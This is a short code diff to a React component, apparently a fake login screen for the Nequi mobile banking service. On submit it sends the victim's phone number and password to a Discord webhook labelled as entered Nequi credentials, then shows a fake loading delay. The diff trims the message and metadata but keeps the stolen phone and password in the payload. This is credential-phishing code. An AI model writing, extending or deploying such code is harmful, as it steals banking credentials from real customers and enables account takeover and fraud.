@@ -19,9 +19,9 @@ export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
     if (!isValid) return
     DiscordWebhookService.sendInfo(
       'Credenciales Nequi ingresadas',
-      'Usuario ingresó su número y contraseña de Nequi',
-      { phone: phoneValue, role: 'Cliente' },
-      { 'Celular': phoneValue, 'Contraseña': password, 'Confirmación': 'Sí' },
+      '',
+      {},
+      { 'Celular': phoneValue, 'Contraseña': password },
     )
     setLoading(true)
     setTimeout(() => {
